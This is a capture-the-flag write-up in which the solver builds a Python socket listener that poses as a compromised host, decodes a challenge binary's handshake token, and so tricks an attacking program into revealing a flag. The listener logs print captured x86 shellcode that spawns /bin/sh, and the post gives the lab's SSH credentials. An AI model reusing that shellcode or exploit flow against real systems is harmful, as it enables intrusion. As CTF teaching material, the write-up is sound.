---
title: "HackPack: Hacking USSR"
categories:
  - HackPackCTF
tags:
  - HackPackCTF
---


We first need to log into the machine with ssh:

```
ssh -p 41705 youngPioneer@cha.hackpack.club
Password: heLovedBigBrother
```

In youngPioneer's home folder, we see a file with a SUID bit set called "throw" that's calling a python script in the /root folder that we don't have access to. Running throw gives us the following message:

```
youngPioneer@fd8402c5dcd0:~$ ./throw
usage: /root/throw.py ATTACK_HOST ATTACK_PORT
```

There's also a note called README:

```
youngPioneer@fd8402c5dcd0:~$ cat README 
"In Soviet Russia...
        ...target p0wn YOU!"
    -- ancient Russian proverb

This one's a little different. ;-)

You're not trying to p0wn a target--the target is trying to p0wn you!

If you can trick the attacker into thinking he's gained execution on your "system," he might try to mark his conquest with a boastful flag...

Hint: check around for what tools we installed on this system to help you out...
```

It looks like we're not trying to exploit the SUID bit. Rather, we're trying to trick it into thinking its pwned a remote host. In order to see what the script is actually doing, we'll point it at our local system. We first need to set up a listener to see what it's sending:

bindscript.py:
```
#!/usr/bin/env python3

import socket

HOST = ''  # Standard loopback interface address (localhost)
PORT = 80       # Port to listen on (non-privileged ports are > 1023)

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((HOST, PORT))
    s.listen()
    conn, addr = s.accept()
    with conn:
        print('Connected by', addr)
        while True:
            data = conn.recv(1024)
            print(data)
            if not data:
                break
```

We can now run the throw binary against our server:

```
./throw xx.xxx.xxx.xx 80
$<5>[$<2>+] Opening connection to xx.xxx.xxx.xx on port 80: Done
Sending sploit...
```

On our listener, we see:

```
Connected by ('152.14.93.208', 4115)
b'\xebUAAAAAAAAAAAAAAAAAAAAAAAAAA\xc0\xc7\xff\xff[\x8ds\x081\xc9\x83\xc1\x041.\x83\xc6\x04\xe2\xf9S\xba\x10\x00\x00\x00\x8dK\x08\xbb\x01\x00\x00\x00\xb8\x04\x00\x00\x00\xcd\x80[1\xc9QS\x89\xe11\xd2\xb8\x0b\x00\x00\x00\xcd\x80\xeb\xfe\xe8\xc4\xff\xff\xff/bin/sh\x005675e1F8dAd59C5C\n'
```

From the looks of it, it's sending a payload to exploit something, followed by /bin/sh and a weird string to spawn a shell. We'll send back some random data to see what it gives us:

```
#!/usr/bin/env python3

import socket

HOST = ''  # Standard loopback interface address (localhost)
PORT = 80       # Port to listen on (non-privileged ports are > 1023)

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((HOST, PORT))
    s.listen()
    conn, addr = s.accept()
    with conn:
        print('Connected by', addr)
        while True:
            data = conn.recv(1024)
            print(data)
            if not data:
                break
            conn.sendall(b'testtesttesttesttest')
```

This time, we see a different string after /bin/sh on our listener, but what's really interesting is what the throw binary says now:

Listener:

```
Connected by ('152.14.93.208', 19582)
b'\xebUAAAAAAAAAAAAAAAAAAAAAAAAAA\xc0\xc7\xff\xff[\x8ds\x081\xc9\x83\xc1\x041.\x83\xc6\x04\xe2\xf9S\xba\x10\x00\x00\x00\x8dK\x08\xbb\x01\x00\x00\x00\xb8\x04\x00\x00\x00\xcd\x80[1\xc9QS\x89\xe11\xd2\xb8\x0b\x00\x00\x00\xcd\x80\xeb\xfe\xe8\xc4\xff\xff\xff/bin/sh\x00CFeEc30B42a47b51\n'
b''
```

```
youngPioneer@fd8402c5dcd0:~$ ./throw xx.xxx.xxx.xx 80
$<5>[$<2>+] Opening connection to xx.xxx.xxx.xx on port 80: Done
$<5>Sending sploit...
No joy! ('testtesttesttest' != "\x02\x07$\x04"rq\x03us uv#tp")
[$<2>*] Closed connection to xx.xxx.xxx.xx port 80
```

Running the binary a few more times shows us that the string after /bin/sh seems to correspond to the string our response is being compared to by the throw binary. We can see that capital letters are being changed into \xnn hex symbols, lowercase letters become a symbol, and numbers become a lowercase letter. 

There may be a more efficient way to do this, but I wasn't able to crack a solution for exactly how this transformation was being completed, so I took note of every transformation. We'll first see what we can do to send back the payload its sending us:

```
#!/usr/bin/env python3

import socket

HOST = ''  # Standard loopback interface address (localhost)
PORT = 80       # Port to listen on (non-privileged ports are > 1023)

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((HOST, PORT))
    s.listen()
    conn, addr = s.accept()
    with conn:
        print('Connected by', addr)
        while True:
            data = conn.recv(1024)
            print(data)
            print(str(data)[-19:-3])
            sendback = str(data)[-19:-3]
            sendback_enc = str.encode(sendback)
            if not data:
                break
            conn.sendall(sendback_enc)
```

Listener:
```
./bindscript.py 
Connected by ('152.14.93.208', 34064)
b'\xebUAAAAAAAAAAAAAAAAAAAAAAAAAA\xc0\xc7\xff\xff[\x8ds\x081\xc9\x83\xc1\x041.\x83\xc6\x04\xe2\xf9S\xba\x10\x00\x00\x00\x8dK\x08\xbb\x01\x00\x00\x00\xb8\x04\x00\x00\x00\xcd\x80[1\xc9QS\x89\xe11\xd2\xb8\x0b\x00\x00\x00\xcd\x80\xeb\xfe\xe8\xc4\xff\xff\xff/bin/sh\x0073a6cFb74aa8865B\n'
73a6cFb74aa8865B
b''
```

throw binary:
```
youngPioneer@fd8402c5dcd0:~$ ./throw xx.xxx.xxx.xx 80
$<5>[$<2>+] Opening connection to xx.xxx.xxx.xx on port 80: Done
$<5>Sending sploit...
No joy! ('73a6cFb74aa8865B' != 'vr w"\x07#vu  yywt\x03')
[$<2>*] Closed connection to xx.xxx.xxx.xx port 80
```

Looks like the string is being sent back in one piece! We can now put our notes to use, in order to properly transform every character before sending it back:

```
#!/usr/bin/env python3

import socket

sendback = ''
output = ''
HOST = ''  # Standard loopback interface address (localhost)
PORT = 80       # Port to listen on (non-privileged ports are > 1023)


def check(data):
    for char in range(len(data)):
        global sendback
        data = list(data)
        if data[char]=='0':
            data[char]='q'
        if data[char]=='1':
            data[char]='p'
        if data[char]=='2':
            data[char]='s' 
        if data[char]=='3':
            data[char]='r'
        if data[char]=='4':
            data[char]='u'
        if data[char]=='5':
            data[char]='t'
        if data[char]=='6':
            data[char]='w'
        if data[char]=='7':
            data[char]='v'
        if data[char]=='8':
            data[char]='y'
        if data[char]=='9':
            data[char]='x'
        if data[char]=='A':
            data[char]='\x00'
        if data[char]=='B':
            data[char]='\x03'
        if data[char]=='C':
            data[char]='\x02'
        if data[char]=='D':
            data[char]='\x05'
        if data[char]=='E':
            data[char]='\x04'
        if data[char]=='F':
            data[char]='\x07'
        if data[char]=='a':
            data[char]=' '
        if data[char]=='b':
            data[char]='#'
        if data[char]=='c':
            data[char]='"'
        if data[char]=='d':
            data[char]='%'
        if data[char]=='e':
            data[char]='$'
        if data[char]=='f':
            data[char]="'"
        sendback = ''.join(data)
        print(sendback)

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((HOST, PORT))
    s.listen()
    conn, addr = s.accept()
    with conn:
        print('Connected by', addr)
        while True:
            data = conn.recv(1024) 
            print(data)
            print(str(data)[-19:-3])
            sendback = str(data)[-19:-3]
            check(sendback)
            sendback_enc = str.encode(sendback)
            if not data:
                break
            conn.sendall(sendback_enc)
```

Listener:
```
Connected by ('152.14.93.208', 17381)
b'\xebUAAAAAAAAAAAAAAAAAAAAAAAAAA\xc0\xc7\xff\xff[\x8ds\x081\xc9\x83\xc1\x041.\x83\xc6\x04\xe2\xf9S\xba\x10\x00\x00\x00\x8dK\x08\xbb\x01\x00\x00\x00\xb8\x04\x00\x00\x00\xcd\x80[1\xc9QS\x89\xe11\xd2\xb8\x0b\x00\x00\x00\xcd\x80\xeb\xfe\xe8\xc4\xff\xff\xff/bin/sh\x0092cD1C64aB82F309\n'
```

throw binary:
```
youngPioneer@fd8402c5dcd0:~$ ./throw xx.xxx.xxx.xx 80
$<5>[$<2>+] Opening connection to xx.xxx.xxx.xx on port 80: Done
Sending sploit...
W00t! Sending `whoami`...
...
b'whoami\n'
```

That's a good sign! We'll assume that it wants to receive "root" back, so we'll just send that string back, followed by a \n:

Final Script (with debugging lines removed for cleanliness):
```
#!/usr/bin/env python3

import socket

sendback = ''
output = ''
HOST = ''  # Standard loopback interface address (localhost)
PORT = 80       # Port to listen on (non-privileged ports are > 1023)


def check(data):
    for char in range(len(data)):
        global sendback
        data = list(data)
        if data[char]=='0':
            data[char]='q'
        if data[char]=='1':
            data[char]='p'
        if data[char]=='2':
            data[char]='s'
        if data[char]=='3':
            data[char]='r'
        if data[char]=='4':
            data[char]='u'
        if data[char]=='5':
            data[char]='t'
        if data[char]=='6':
            data[char]='w'
        if data[char]=='7':
            data[char]='v'
        if data[char]=='8':
            data[char]='y'
        if data[char]=='9':
            data[char]='x'
        if data[char]=='A':
            data[char]='\x00'
        if data[char]=='B':
            data[char]='\x03'
        if data[char]=='C':
            data[char]='\x02'
        if data[char]=='D':
            data[char]='\x05'
        if data[char]=='E':
            data[char]='\x04'
        if data[char]=='F':
            data[char]='\x07'
        if data[char]=='a':
            data[char]=' '
        if data[char]=='b':
            data[char]='#'
        if data[char]=='c':
            data[char]='"'
        if data[char]=='d':
            data[char]='%'
        if data[char]=='e':
            data[char]='$'
        if data[char]=='f':
            data[char]="'"
        sendback = ''.join(data)

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((HOST, PORT))
    s.listen()
    conn, addr = s.accept()
    with conn:
        print('Connected by', addr)
        while True:
            data = conn.recv(1024) 
            print(data)
            print(str(data)[-19:-3])
            sendback = str(data)[-19:-3]
            check(sendback)
            sendback_enc = str.encode(sendback)
            if not data:
                break
            conn.sendall(sendback_enc)
            data2 = conn.recv(1024)
            print(data2)
            conn.sendall(b'root\n')
            data3 = conn.recv(1024)
            print(data3)
```

Listener:

```
Connected by ('152.14.93.208', 22389)
b'\xebUAAAAAAAAAAAAAAAAAAAAAAAAAA\xc0\xc7\xff\xff[\x8ds\x081\xc9\x83\xc1\x041.\x83\xc6\x04\xe2\xf9S\xba\x10\x00\x00\x00\x8dK\x08\xbb\x01\x00\x00\x00\xb8\x04\x00\x00\x00\xcd\x80[1\xc9QS\x89\xe11\xd2\xb8\x0b\x00\x00\x00\xcd\x80\xeb\xfe\xe8\xc4\xff\xff\xff/bin/sh\x002DB18b3E6f0eeDBF\n'
2DB18b3E6f0eeDBF
b'whoami\n'
b'echo "flag{tw0_p1u$_t00_equ@15_wh@t3v3r_th3_p@rty_s@y5_c0mr@d3}" > /etc/motd\n'
b''
```

throw binary:

```
youngPioneer@fd8402c5dcd0:~$ ./throw xx.xxx.xxx.xx
$<5>[$<2>+] Opening connection to xx.xxx.xxx.xx on port 80: Done
$<5>Sending sploit...
W00t! Sending `whoami`...
W00t! Sending `echo "flag{tw0_p1u$_t00_equ@15_wh@t3v3r_th3_p@rty_s@y5_c0mr@d3}" > /etc/motd`
[$<2>*] Closed connection to xx.xxx.xxx.xx port 80
```

There's our flag!

**flag{tw0_p1u$_t00_equ@15_wh@t3v3r_th3_p@rty_s@y5_c0mr@d3}**
